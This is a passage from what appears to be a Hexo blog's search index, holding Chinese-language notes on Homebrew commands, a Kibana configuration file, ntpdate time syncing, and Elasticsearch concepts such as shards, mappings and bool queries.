list</span><br></pre></td></tr></table></figure></li></ol><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p><code>brew</code>和包含的包源都是通过<code>github</code>来管理，人为的维护管理，除了自己的源还允许别人的源添加进来。很多时候有些软件包并不在官方提供列表里面而是由第三方提供的这个时候，我们就需要使用下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew [un]tap &lt;github_userid/repo_name&gt; #添加或者删除仓库</span><br></pre></td></tr></table></figure><h3 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h3><p><a href="https://github.com/Homebrew/homebrew-services">https://github.com/Homebrew/homebrew-services</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">brew services [start|stop|restart] [package_name]</span><br><span class="line"></span><br><span class="line">brew services list</span><br><span class="line"></span><br><span class="line">brew services cleanup</span><br></pre></td></tr></table></figure><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew doctor</span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ol><li>In macOS 10.12 Sierra, &#x2F;usr&#x2F;local is readonly<br> <a href="https://maomihz.com/2016/09/upgrade-sierra-homebrew/">升级macOS Sierra后修复brew可能存在的问题</a> <a href="https://github.com/Homebrew/brew/issues/385">In macOS 10.12 Sierra, &#x2F;usr&#x2F;local is readonly.</a> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) /usr/local</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.jianshu.com/p/8ad7056b243f">Homebrew总结</a></li><li><a href="http://icyleaf.com/2014/01/homebrew-hidden-commands/">Homebrew 隐藏命令</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> brew </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kibana.md</title>
      <link href="/post/kibana.html"/>
      <url>/post/kibana.html</url>
      
        <content type="html"><![CDATA[<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kibana is served by a back end server. This controls which port to use.</span></span><br><span class="line"><span class="comment"># server.port: 5601</span></span><br><span class="line"><span class="attr">server.port:</span> <span class="number">5601</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The host to bind the server to.</span></span><br><span class="line"><span class="comment"># server.host: &quot;0.0.0.0&quot;</span></span><br><span class="line"><span class="attr">server.host:</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you are running kibana behind a proxy, and want to mount it at a path,</span></span><br><span class="line"><span class="comment"># specify that path here. The basePath can&#x27;t end in a slash.</span></span><br><span class="line"><span class="comment"># server.basePath: &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The maximum payload size in bytes on incoming server requests.</span></span><br><span class="line"><span class="comment"># server.maxPayloadBytes: 1048576</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The Elasticsearch instance to use for all your queries.</span></span><br><span class="line"><span class="comment"># elasticsearch.url: &quot;http://localhost:9200&quot;</span></span><br><span class="line"><span class="attr">elasticsearch.url:</span> <span class="string">&quot;http://elk.my-guide.cc:9200&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,</span></span><br><span class="line"><span class="comment"># then the host you use to connect to *this* Kibana instance will be sent.</span></span><br><span class="line"><span class="comment"># elasticsearch.preserveHost: true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kibana uses an index in Elasticsearch to store saved searches, visualizations</span></span><br><span class="line"><span class="comment"># and dashboards. It will create a new index if it doesn&#x27;t already exist.</span></span><br><span class="line"><span class="comment"># kibana.index: &quot;.kibana&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The default application to load.</span></span><br><span class="line"><span class="comment"># kibana.defaultAppId: &quot;discover&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If your Elasticsearch is protected with basic auth, these are the user credentials</span></span><br><span class="line"><span class="comment"># used by the Kibana server to perform maintenance on the kibana_index at startup. Your Kibana</span></span><br><span class="line"><span class="comment"># users will still need to authenticate with Elasticsearch (which is proxied through</span></span><br><span class="line"><span class="comment"># the Kibana server)</span></span><br><span class="line"><span class="comment"># elasticsearch.username: &quot;user&quot;</span></span><br><span class="line"><span class="comment"># elasticsearch.password: &quot;pass&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSL for outgoing requests from the Kibana Server to the browser (PEM formatted)</span></span><br><span class="line"><span class="comment"># server.ssl.cert: /path/to/your/server.crt</span></span><br><span class="line"><span class="comment"># server.ssl.key: /path/to/your/server.key</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Optional setting to validate that your Elasticsearch backend uses the same key files (PEM formatted)</span></span><br><span class="line"><span class="comment"># elasticsearch.ssl.cert: /path/to/your/client.crt</span></span><br><span class="line"><span class="comment"># elasticsearch.ssl.key: /path/to/your/client.key</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you need to provide a CA certificate for your Elasticsearch instance, put</span></span><br><span class="line"><span class="comment"># the path of the pem file here.</span></span><br><span class="line"><span class="comment"># elasticsearch.ssl.ca: /path/to/your/CA.pem</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set to false to have a complete disregard for the validity of the SSL</span></span><br><span class="line"><span class="comment"># certificate.</span></span><br><span class="line"><span class="comment"># elasticsearch.ssl.verify: true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time in milliseconds to wait for elasticsearch to respond to pings, defaults to</span></span><br><span class="line"><span class="comment"># request_timeout setting</span></span><br><span class="line"><span class="comment"># elasticsearch.pingTimeout: 1500</span></span><br><span class="line"><span class="attr">elasticsearch.pingTimeout:</span> <span class="number">1500</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time in milliseconds to wait for responses from the back end or elasticsearch.</span></span><br><span class="line"><span class="comment"># This must be &gt; 0</span></span><br><span class="line"><span class="comment"># elasticsearch.requestTimeout: 30000</span></span><br><span class="line"><span class="attr">elasticsearch.requestTimeout:</span> <span class="number">30000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time in milliseconds for Elasticsearch to wait for responses from shards.</span></span><br><span class="line"><span class="comment"># Set to 0 to disable.</span></span><br><span class="line"><span class="comment"># elasticsearch.shardTimeout: 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time in milliseconds to wait for Elasticsearch at Kibana startup before retrying</span></span><br><span class="line"><span class="comment"># elasticsearch.startupTimeout: 5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the path to where you would like the process id file to be created.</span></span><br><span class="line"><span class="comment"># pid.file: /var/run/kibana.pid</span></span><br><span class="line"><span class="attr">pid.file:</span> <span class="string">/var/run/kibana.pid</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you would like to send the log output to a file you can set the path below.</span></span><br><span class="line"><span class="comment"># logging.dest: stdout</span></span><br><span class="line"><span class="attr">logging.dest:</span> <span class="string">/opt/kibana/logs/kibana.log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to true to suppress all logging output.</span></span><br><span class="line"><span class="comment"># logging.silent: false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to true to suppress all logging output except for error messages.</span></span><br><span class="line"><span class="comment"># logging.quiet: false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to true to log all events, including system usage information and all requests.</span></span><br><span class="line"><span class="comment"># logging.verbose: false</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>时间同步.md</title>
      <link href="/post/linux-ntpdate.html"/>
      <url>/post/linux-ntpdate.html</url>
      
        <content type="html"><![CDATA[<ol><li>安装ntpdate</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install ntpdate.x86_64</span><br><span class="line"></span><br><span class="line">OR</span><br><span class="line"></span><br><span class="line">apt-get install ntpdate</span><br></pre></td></tr></table></figure><ol start="2"><li>同步时间</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate time.nist.gov</span><br></pre></td></tr></table></figure><ol start="3"><li>定时同步</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 每10分钟同步一次</span><br><span class="line">crontab -e</span><br><span class="line">*/10 * * * * /usr/sbin/ntpdate time.nist.gov</span><br></pre></td></tr></table></figure><blockquote><p>ntp 服务器使用udp，默认端口123</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch</title>
      <link href="/post/elasticsearch.html"/>
      <url>/post/elasticsearch.html</url>
      
        <content type="html"><![CDATA[<h3 id="Java-API-客户端"><a href="#Java-API-客户端" class="headerlink" title="Java API 客户端"></a>Java API 客户端</h3><ul><li>节点客户端（Node client）<br>节点客户端作为一个非数据节点加入到本地集群中。换句话说，它本身不保存任何数据，但是它知道数据在集群中的哪个节点中，并且可以把请求转发到正确的节点。</li><li>传输客户端（Transport client）<br>轻量级的传输客户端可以可以将请求发送到远程集群。它本身不加入集群，但是它可以将请求转发到集群中的一个节点上。</li></ul><h3 id="面向文档"><a href="#面向文档" class="headerlink" title="面向文档"></a>面向文档</h3><p>也许有一天你想把这些对象存储在数据库中。使用关系型数据库的行和列存储，这相当于是把一个表现力丰富的对象挤压到一个非常大的电子表格中：你必须将这个对象扁平化来适应表结构–通常一个字段&gt;对应一列–而且又不得不在每次查询时重新构造对象。</p><p>Elasticsearch 是 面向文档 的，意味着它存储整个对象或 文档_。Elasticsearch 不仅存储文档，而且 _索引 每个文档的内容使之可以被检索。在 Elasticsearch 中，你 对文档进行索引、检索、排序和过滤–而不是对行列数据。</p><h3 id="简单命令"><a href="#简单命令" class="headerlink" title="简单命令"></a>简单命令</h3><ul><li>将 HTTP 命令由 PUT 改为 GET 可以用来检索文档，同样的，可以使用 DELETE 命令来删除文档，以及使用 HEAD 指令来检查文档是否存在。如果想更新已存在的文档，只需再次 PUT 。</li></ul><h3 id="常用接口"><a href="#常用接口" class="headerlink" title="常用接口"></a>常用接口</h3><ol><li>创建mapping</li></ol><h3 id="集群内的原理"><a href="#集群内的原理" class="headerlink" title="集群内的原理"></a>集群内的原理</h3><p>一个运行中的 Elasticsearch 实例称为一个 节点，而集群是由一个或者多个拥有相同 cluster.name 配置的节点组成，<strong>它们共同承担数据和负载的压力</strong>。当有节点加入集群中或者从集群中移除节点时，<strong>集群将会重新平均分布所有的数据</strong>。</p><p>当一个节点被选举成为主节点时，<strong>它将负责管理集群范围内的所有变更</strong>，例如增加、删除索引，或者增加、删除节点等。而主节点并不需要涉及到文档级别的变更和搜索等操作。</p><p><strong>我们可以将请求发送到集群中的任何节点</strong>，包括主节点。<strong>每个节点都知道任意文档所处的位置</strong>，并且能够将我们的请求直接转发到存储我们所需文档的节点。无论我们将请求发送到哪个节点，它都能负责从各个包含我们所需文档的节点收集回数据，并将最终结果返回給客户端。</p><h3 id="集群健康"><a href="#集群健康" class="headerlink" title="集群健康"></a>集群健康</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET /_cluster/health</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   &quot;cluster_name&quot;: &quot;library&quot;,</span><br><span class="line">   &quot;status&quot;: &quot;yellow&quot;,</span><br><span class="line">   &quot;timed_out&quot;: false,</span><br><span class="line">   &quot;number_of_nodes&quot;: 1,</span><br><span class="line">   &quot;number_of_data_nodes&quot;: 1,</span><br><span class="line">   &quot;active_primary_shards&quot;: 5,</span><br><span class="line">   &quot;active_shards&quot;: 5,</span><br><span class="line">   &quot;relocating_shards&quot;: 0,</span><br><span class="line">   &quot;initializing_shards&quot;: 0,</span><br><span class="line">   &quot;unassigned_shards&quot;: 5,</span><br><span class="line">   &quot;delayed_unassigned_shards&quot;: 0,</span><br><span class="line">   &quot;number_of_pending_tasks&quot;: 0,</span><br><span class="line">   &quot;number_of_in_flight_fetch&quot;: 0,</span><br><span class="line">   &quot;task_max_waiting_in_queue_millis&quot;: 0,</span><br><span class="line">   &quot;active_shards_percent_as_number&quot;: 50</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>status 字段是我们最关心的。status 字段指示着当前集群在总体上是否工作正常。它的三种颜色含义如下：</p><ul><li>green<br>  所有的<strong>主分片</strong>和<strong>副本分片</strong>都正常运行。</li><li>yellow<br>  所有的主分片都正常运行，但不是所有的副本分片都正常运行。</li><li>red<br>  有主分片没能正常运行。</li></ul><h3 id="分片"><a href="#分片" class="headerlink" title="分片"></a>分片</h3><p>我们往 Elasticsearch 添加数据时需要用到 索引 —— 保存相关数据的地方。 索引实际上是指向一个或者多个物理分片的逻辑命名空间 。</p><p>一个分片是一个底层的工作单元 ，它仅保存了全部数据中的一部分。 在分片内部机制中，我们将详细介绍分片是如何工作的，而现在我们只需知道<strong>一个分片是一个 Lucene 的实例</strong>，以及它本身就是一个完整的搜索引擎。 我们的文档被存储和索引到分片内，但是应用程序是直接与索引而不是与分片进行交互。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 分配3个主分片和一份副本（每个主分片拥有一个副本分片） --&gt;</span><br><span class="line">PUT /blogs</span><br><span class="line">&#123;</span><br><span class="line">   &quot;settings&quot; : &#123;</span><br><span class="line">      &quot;number_of_shards&quot; : 3, </span><br><span class="line">      &quot;number_of_replicas&quot; : 1</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>技术上来说，一个主分片最大能够存储 Integer.MAX_VALUE - 128 个文档</p></blockquote><p>一个副本分片只是一个主分片的拷贝。 副本分片作为硬件故障时保护数据不丢失的冗余备份，并为搜索和返回文档等读操作提供服务。</p><p>主分片的数目在索引创建时 就已经确定了下来。 但是，读操作——搜索和返回数据——可以同时被主分片或副本分片所处理，<strong>所以当你拥有越多的副本分片时，也将拥有越高的吞吐量</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PUT /blogs/_settings</span><br><span class="line">&#123;</span><br><span class="line">   &quot;number_of_replicas&quot; : 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文档元数据"><a href="#文档元数据" class="headerlink" title="文档元数据"></a>文档元数据</h3><ul><li><p>_index<br>  一个索引应该是因共同的特性被分组到一起的文档集合。</p></li><li><p>_type<br>  数据可能在索引中只是松散的组合在一起，但是通常明确定义一些数据中的子分区是很有用的。</p><blockquote><p>这里我们用数据库的database去类比_index，table类比_type是不合适的，一个数据库里面每个表往往有很大差异。如果在es这样对应，那么一个_index下面的文档可能根本就没有同工特性。这是不合适的，建议尽可能一个table就是一个_index。<code>index.mapping.single_type</code></p></blockquote></li><li><p>_id<br>  ID 是一个字符串， 当它和 _index 以及 _type 组合就可以唯一确定 Elasticsearch 中的一个文档。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUT /library</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;number_of_shards&quot; :   4,</span><br><span class="line">        &quot;number_of_replicas&quot; : 1,</span><br><span class="line">        &quot;index.mapping.single_type&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://elasticsearch.cn/book/elasticsearch_definitive_guide_2.x/mapping.html">https://elasticsearch.cn/book/elasticsearch_definitive_guide_2.x/mapping.html</a></p><h4 id="创建新文档"><a href="#创建新文档" class="headerlink" title="创建新文档"></a>创建新文档</h4><p>两种方式 POST 、PUT。POST 不能指定ID，PUT方式可以自定义ID（不同于新增，我们需要在后面加?op_type&#x3D;create或者&#x2F;_create说明这个操作是新增不是更新）。</p><ul><li><p>POST</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/</span><br><span class="line">&#123;</span><br><span class="line">&quot;title&quot;: &quot;My first blog entry&quot;,</span><br><span class="line">&quot;text&quot;:  &quot;Just trying this out...&quot;,</span><br><span class="line">&quot;date&quot;:  &quot;2017/10/21&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>PUT </p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /website/blog/123/_create</span><br><span class="line">&#123;</span><br><span class="line">&quot;title&quot;: &quot;My first blog entry&quot;,</span><br><span class="line">&quot;text&quot;:  &quot;Just trying this out...&quot;,</span><br><span class="line">&quot;date&quot;:  &quot;2017/10/21&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h4><p>PUT 整体更新（直接替换），POST &#x2F;_update 局部更新。<br><strong>文档不能被修改，只能被替换。</strong></p><ol><li>从旧文档构建 JSON</li><li>更改该 JSON</li><li>删除旧文档</li><li>索引一个新文档</li></ol><h3 id="乐观并发控制"><a href="#乐观并发控制" class="headerlink" title="乐观并发控制"></a>乐观并发控制</h3><ul><li><p>悲观并发控制<br>这种方法被关系型数据库广泛使用，它假定有变更冲突可能发生，因此阻塞访问资源以防止冲突。 一个典型的例子是读取一行数据之前先将其锁住，确保只有放置锁的线程能够对这行数据进行修改。</p></li><li><p>乐观并发控制<br>Elasticsearch 中使用的这种方法假定冲突是不可能发生的，并且不会阻塞正在尝试的操作。 然而，如果源数据在读写当中被修改，更新将会失败。应用程序接下来将决定该如何解决冲突。 例如，可以重试更新、使用新的数据、或者将相关情况报告给用户。</p></li></ul><p>Elasticsearch 是分布式的。当文档创建、更新或删除时，新版本的文档必须复制到集群中的其他节点。Elasticsearch 也是异步和并发的，这意味着这些复制请求被并行发送，并且到达目的地时也许顺序是乱的 。Elasticsearch 使用 _version 号来确保变更以正确顺序得到执行。如果旧版本的文档在新版本之后到达，它可以被简单的忽略。</p><h3 id="分布式文档存储"><a href="#分布式文档存储" class="headerlink" title="分布式文档存储"></a>分布式文档存储</h3><p>当索引一个文档的时候，文档会被存储到一个主分片中。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shard = hash(routing) % number_of_primary_shards</span><br></pre></td></tr></table></figure><blockquote><p>我们要在创建索引的时候就确定好主分片的数量并且永远不会改变这个数量：因为如果数量变化了，那么所有之前路由的值都会无效，文档也再也找不到了。</p></blockquote><p>我们可以发送请求到集群中的任一节点。<strong>每个节点都有能力处理任意请求</strong>。 每个节点都知道集群中任一文档位置，所以可以直接将请求转发到需要的节点上。   </p><p>新建、索引和删除请求都是<strong>写</strong>操作，必须在主分片上面完成之后才能被复制到相关的副本分片。</p><p><img src="/images/QQ20171023-152716@2x.jpg"></p><ol><li>客户端向 Node 1 发送新建、索引或者删除请求。</li><li>节点使用文档的 _id 确定文档属于分片 0<code>。请求会被转发到 </code>Node 3<code>，因为分片 0 的主分片目前被分配在 </code>Node 3 上。</li><li>Node 3 在主分片上面执行请求。如果成功了，它将请求并行转发到 Node 1 和 Node 2 的副本分片上。一旦所有的副本分片都报告成功, Node 3 将向协调节点报告成功，协调节点向客户端报告成功。</li></ol><p><img src="/images/QQ20171023-153637@2x.jpg"></p><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><ul><li>映射（Mapping）<br>  描述数据在每个字段内如何存储</li><li>分析（Analysis）<br>  全文是如何处理使之可以被搜索的</li><li>领域特定查询语言（Query DSL）<br>  Elasticsearch 中强大灵活的查询语言</li></ul><h3 id="分析与分析器"><a href="#分析与分析器" class="headerlink" title="分析与分析器"></a>分析与分析器</h3><p>分析器实际上是将三个功能封装到了一个包里：</p><ul><li>字符过滤器<br>  首先，字符串按顺序通过每个字符过滤器 。他们的任务是在分词前整理字符串。一个字符过滤器可以用来去掉HTML，或者将 &amp; 转化成 <code>and</code>。</li><li>分词器<br>  其次，字符串被 分词器 分为单个的词条。一个简单的分词器遇到空格和标点的时候，可能会将文本拆分成词条。</li><li>Token 过滤器<br>  最后，词条按顺序通过每个 token 过滤器 。这个过程可能会改变词条（例如，小写化 Quick ），删除词条（例如， 像 a<code>， </code>and<code>， </code>the 等无用词），或者增加词条（例如，像 jump 和 leap 这种同义词）。</li></ul><h4 id="测试分词器"><a href="#测试分词器" class="headerlink" title="测试分词器"></a>测试分词器</h4><blockquote><p>&#x2F;_analyze?analyzer&#x3D;ik_smart&amp;pretty&#x3D;true&amp;text&#x3D;word</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;standard&quot;, // 分词器名称</span><br><span class="line">  &quot;text&quot;: &quot;Text to analyze&quot; // 被分词的文本</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><p>Elasticsearch 支持 如下简单域类型：</p><ul><li>字符串: string</li><li>整数 : byte, short, integer, long</li><li>浮点数: float, double</li><li>布尔型: boolean</li><li>日期: date</li></ul><p>获取某个类型的mapping</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /website/_mapping/blog</span><br></pre></td></tr></table></figure><p><a href="https://elasticsearch.cn/book/elasticsearch_definitive_guide_2.x/mapping-intro.html">https://elasticsearch.cn/book/elasticsearch_definitive_guide_2.x/mapping-intro.html</a><br><img src="/images/WechatIMG32.jpeg"></p><blockquote><p>当 <code>index</code> 设置为 <code>no</code> 时意味着 <code>elasticsearch</code> 不对这个自动索引，仅仅是存储（具体还要看索引配置是否存储 <code>_source</code> ）。我们不能再此字段应用任何形式（模糊、精确、范围）的查询。</p></blockquote><h3 id="复杂核心域类型"><a href="#复杂核心域类型" class="headerlink" title="复杂核心域类型"></a>复杂核心域类型</h3><p>除了简单标量数据类型，JSON 还有 null 值，数组，和对象。这些 Elasticsearch 都是支持的。</p><h3 id="查询与过滤"><a href="#查询与过滤" class="headerlink" title="查询与过滤"></a>查询与过滤</h3><p>Elasticsearch 使用的查询语言（DSL） 拥有一套查询组件，这些组件可以以无限组合的方式进行搭配。这套组件可以在以下两种情况下使用：过滤情况（filtering context）和查询情况（query context）。</p><p>当使用于 过滤情况 时，查询被设置成一个“不评分”或者“过滤”查询。即，这个查询只是简单的问一个问题：“这篇文档是否匹配？”。回答也是非常的简单，yes 或者 no ，二者必居其一。</p><ul><li>created 时间是否在 2013 与 2014 这个区间？</li><li>status 字段是否包含 published 这个单词？</li><li>lat_lon 字段表示的位置是否在指定点的 10km 范围内？</li></ul><p>当使用于 查询情况 时，查询就变成了一个“评分”的查询。和不评分的查询类似，也要去判断这个文档是否匹配，同时它还需要判断这个文档匹配的有 <em>多好</em>（匹配程度如何）。 此查询的典型用法是用于查找以下文档：</p><ul><li>查找与 full text search 这个词语最佳匹配的文档</li><li>包含 run 这个词，也能匹配 runs 、 running 、 jog 或者 sprint</li><li>包含 quick 、 brown 和 fox 这几个词 — 词之间离的越近，文档相关性越高</li><li>标有 lucene 、 search 或者 java 标签 — 标签越多，相关性越高</li></ul><p>一个评分查询计算每一个文档与此查询的 <em>相关程度</em>，同时将这个相关程度分配给表示相关性的字段 <code>_score</code>，并且按照相关性对匹配到的文档进行排序。这种相关性的概念是非常适合全文搜索的情况，因为全文搜索几乎没有完全 “正确” 的答案。</p><p>过滤查询（Filtering queries）只是简单的检查包含或者排除，这就使得计算起来非常快。通常的使用查询（query）语句来进行全文搜索或者其它任何需要影响相关性得分的搜索。除此以外的情况都使用过滤（filters)。</p><p>组合查询<br>    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;bool&quot;: &#123;</span><br><span class="line">            &quot;must&quot;:     [&#123; &quot;match&quot;: &#123; &quot;tweet&quot;: &quot;elasticsearch&quot; &#125;&#125;],</span><br><span class="line">            &quot;must_not&quot;: [&#123; &quot;match&quot;: &#123; &quot;name&quot;:  &quot;mary&quot; &#125;&#125;],</span><br><span class="line">            &quot;should&quot;:   [&#123; &quot;match&quot;: &#123; &quot;tweet&quot;: &quot;full text&quot; &#125;&#125;], // 等价于 or </span><br><span class="line">            &quot;filter&quot;:   [&#123; &quot;range&quot;: &#123; &quot;age&quot; : &#123; &quot;gt&quot; : 30 &#125;&#125; &#125;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>must<br>  文档 必须 匹配这些条件才能被包含进来。</li><li>must_not<br>  文档 必须不 匹配这些条件才能被包含进来。</li><li>should<br>  如果满足这些语句中的任意语句，将增加 _score (通过boost参数设置加几分，默认1分)，否则，无任何影响。它们主要用于修正每个文档的相关性得分。</li><li>filter<br>  必须匹配，但它以不评分、过滤模式来进行。这些语句对评分没有贡献，只是根据过滤标准来排除或包含文档。</li></ul><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><ul><li>match_all 匹配所有文档  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 